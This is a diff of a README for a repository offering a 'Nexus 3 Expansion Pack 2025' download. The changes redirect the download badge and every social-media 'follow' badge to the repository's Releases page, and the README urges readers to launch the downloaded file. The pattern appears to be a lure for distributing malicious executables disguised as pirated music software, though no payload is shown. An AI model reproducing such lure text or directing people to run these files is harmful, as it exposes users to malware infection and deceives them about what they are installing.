@@ -32,7 +32,7 @@ Welcome to the Nexus 3 Expansion Pack 2025 repository - your go-to collection of
 
 ## Explore the Expansion Packs 🚀
 Click the button below to download the latest expansion pack release:
-[![Download Expansion Pack](https://img.shields.io/badge/Download-Expansion Pack-green)](https://github.com/assets/Release.zip)
+[![Download Expansion Pack](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases Pack-green)](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)
 
 If the link ends with a file name, make sure to launch the file to access the exciting expansion packs waiting for you. And if the link is not working or you want to explore more options, be sure to check out the "Releases" section of this repository for additional updates and content.
 
@@ -52,8 +52,8 @@ Stay updated with the latest news, releases, and discussions by following us on 
 
 Let's continue to push the boundaries of music production together with the Nexus 3 Expansion Pack 2025. Happy creating! 🎹🔥
 
-[![Follow us on Twitter](https://img.shields.io/badge/Follow-@NexusExpansionPack2025-blue)](https://twitter.com/NexusExpansionPack2025)
+[![Follow us on Twitter](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)
 
-[![Follow us on Instagram](https://img.shields.io/badge/Follow-@NexusExpansionPack2025-orange)](https://instagram.com/NexusExpansionPack2025)
+[![Follow us on Instagram](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)
 
-[![Follow us on Facebook](https://img.shields.io/badge/Follow-NexusExpansionPack2025-lightblue)](https://facebook.com/NexusExpansionPack2025)
+[![Follow us on Facebook](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)](https://github.com/CutSceneStudio/Nexus-3-Expansion-Pack-2025/releases)
